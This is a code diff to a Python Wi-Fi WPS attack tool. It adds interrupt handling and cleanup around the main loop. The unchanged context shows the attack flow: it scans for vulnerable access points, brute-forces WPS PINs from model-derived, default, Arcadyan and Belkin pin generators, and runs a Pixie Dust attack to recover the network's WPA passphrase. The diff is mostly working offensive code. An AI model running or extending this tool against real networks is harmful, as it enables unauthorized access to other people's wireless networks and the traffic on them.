@@ -58,7 +58,11 @@ def check_exit():
 
 
 def user_input(prompt):
-    resp = input(prompt)
+    try:
+        resp = input(prompt)
+    except KeyboardInterrupt:
+        print("\nAborting…")
+        sys.exit(0)
     if resp.lower() == 'ex':
         print("\nAborting…")
         sys.exit(0)
@@ -984,20 +988,25 @@ class Companion:
             print(self._explain_wpas_not_ok_status(cmd, r))
             return False
 
-        while True:
-            check_exit()
-            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=self.bssid)
-            if not res:
-                break
-            if self.connection_status.status == 'WSC_NACK':
-                break
-            elif self.connection_status.status == 'GOT_PSK':
-                break
-            elif self.connection_status.status == 'WPS_FAIL':
-                break
-
-        success = self.connection_status.status == 'GOT_PSK'
-        self.sendOnly('WPS_CANCEL')
+        success = False
+        try:
+            while True:
+                check_exit()
+                res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=self.bssid)
+                if not res:
+                    break
+                if self.connection_status.status == 'WSC_NACK':
+                    break
+                elif self.connection_status.status == 'GOT_PSK':
+                    break
+                elif self.connection_status.status == 'WPS_FAIL':
+                    break
+        except KeyboardInterrupt:
+            print("\nAborting…")
+            raise
+        finally:
+            success = self.connection_status.status == 'GOT_PSK'
+            self.sendOnly('WPS_CANCEL')
         return success
 
     def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, pixieforce=False,
@@ -1509,46 +1518,50 @@ if __name__ == '__main__':
         die('Unable to up interface "{}"'.format(args.interface))
 
     force_loop = args.loop or args.push_button_connect
+    companion = None
 
-    while True:
-        check_exit()
-        companion = Companion(args.interface, args.write, print_debug=args.verbose)
-        if args.push_button_connect:
-            companion.single_connection(args.bssid, pbc_mode=True)
-        else:
-            essid = None
-            network = None
-            if not args.bssid:
-                scanner = WiFiScanner(args.interface, vuln_list, args.reverse_scan)
-                if not args.loop:
-                    print('[*] BSSID not specified (--bssid) — scanning for available networks')
-                network = scanner.prompt_network()
-                if network:
-                    args.bssid = network['BSSID']
-                    essid = network.get('ESSID')
-            if args.bssid:
-                companion = Companion(args.interface, args.write, print_debug=args.verbose)
-                if args.pin:
-                    companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
-                else:
-                    model = network.get('Model', '') + network.get('Model number', '') if network else ''
-                    device = network.get('Device name', '') if network else ''
-                    if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device), delay=args.delay):
-                        if args.pixie_dust:
-                            print('[*] Trying Pixie Dust attack...')
-                            companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
-                        if companion.connection_status.status != 'GOT_PSK':
-                            if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid), delay=args.delay):
-                                if not try_pin_sequence(companion, args.bssid, DEFAULT_PINS, delay=args.delay):
-                                    pins = generate_pins(mac=args.bssid, ssid=essid)
-                                    if not try_pin_sequence(companion, args.bssid, pins, delay=args.delay):
-                                        if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p], delay=args.delay):
-                                            if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p], delay=args.delay):
-                                                print('[-] All PIN attempts failed')
-        if not force_loop:
-            break
-        if args.loop:
-            args.bssid = None
-
-    if args.iface_down:
-        ifaceUp(args.interface, down=True)
+    try:
+        while True:
+            check_exit()
+            companion = Companion(args.interface, args.write, print_debug=args.verbose)
+            if args.push_button_connect:
+                companion.single_connection(args.bssid, pbc_mode=True)
+            else:
+                essid = None
+                network = None
+                if not args.bssid:
+                    scanner = WiFiScanner(args.interface, vuln_list, args.reverse_scan)
+                    network = scanner.prompt_network()
+                    if network:
+                        args.bssid = network['BSSID']
+                        essid = network.get('ESSID')
+                if args.bssid:
+                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                    if args.pin:
+                        companion.single_connection(args.bssid, args.pin, args.pixie_dust, args.push_button_connect, args.pixie_force)
+                    else:
+                        model = network.get('Model', '') + network.get('Model number', '') if network else ''
+                        device = network.get('Device name', '') if network else ''
+                        if not try_pin_sequence(companion, args.bssid, generate_model_pins(mac=args.bssid, ssid=essid, model=model, device=device), delay=args.delay):
+                            if args.pixie_dust:
+                                print('[*] Trying Pixie Dust attack...')
+                                companion.single_connection(args.bssid, None, pixiemode=True, pixieforce=args.pixie_force)
+                            if companion.connection_status.status != 'GOT_PSK':
+                                if not try_pin_sequence(companion, args.bssid, generate_suggested_pins(args.bssid), delay=args.delay):
+                                    if not try_pin_sequence(companion, args.bssid, DEFAULT_PINS, delay=args.delay):
+                                        pins = generate_pins(mac=args.bssid, ssid=essid)
+                                        if not try_pin_sequence(companion, args.bssid, pins, delay=args.delay):
+                                            if not try_pin_sequence(companion, args.bssid, [p for p in [arcadyan_pin(args.bssid)] if p], delay=args.delay):
+                                                if not try_pin_sequence(companion, args.bssid, [p for p in [belkin_pin(args.bssid)] if p], delay=args.delay):
+                                                    print('[-] All PIN attempts failed')
+            if not force_loop:
+                break
+            if args.loop:
+                args.bssid = None
+    except KeyboardInterrupt:
+        print('\nAborting…')
+    finally:
+        if companion:
+            companion.cleanup()
+        if args.iface_down:
+            ifaceUp(args.interface, down=True)
